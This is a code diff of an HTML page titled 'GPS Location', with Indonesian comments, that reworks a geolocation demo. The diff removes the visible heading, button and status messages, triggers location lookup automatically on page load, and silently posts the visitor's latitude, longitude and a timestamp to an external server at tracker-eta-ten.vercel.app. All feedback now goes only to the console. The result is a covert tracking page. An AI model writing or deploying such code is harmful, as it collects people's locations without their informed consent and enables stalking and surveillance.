@@ -6,24 +6,20 @@
     <title>GPS Location</title>
 </head>
 <body>
-    <h1>Get GPS Data</h1>
-    <button onclick="getLocation()">Get Location</button>
-    <p id="status">Waiting for location...</p>
-
     <script>
-        function getLocation() {
+        // Fungsi ini akan dipanggil ketika halaman dimuat
+        window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendPosition, showError);
             } else {
-                document.getElementById("status").innerHTML = "Geolocation is not supported by this browser.";
+                console.log("Geolocation is not supported by this browser.");
             }
-        }
+        };
 
         function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-
-            document.getElementById("status").innerHTML = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            const timestamp = new Date().toISOString(); // Menyimpan waktu akses dalam format ISO
 
             // Kirim data ke server Flask
             fetch('https://tracker-eta-ten.vercel.app/', {
@@ -31,11 +27,15 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ latitude: latitude, longitude: longitude })
+                body: JSON.stringify({ 
+                    latitude: latitude, 
+                    longitude: longitude,
+                    timestamp: timestamp 
+                })
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Success:', data);
+                console.log('Data sent successfully:', data);
             })
             .catch((error) => {
                 console.error('Error:', error);
@@ -43,20 +43,7 @@
         }
 
         function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("status").innerHTML = "User denied the request for Geolocation.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("status").innerHTML = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("status").innerHTML = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("status").innerHTML = "An unknown error occurred.";
-                    break;
-            }
+            console.error("Error in retrieving location:", error);
         }
     </script>
 </body>
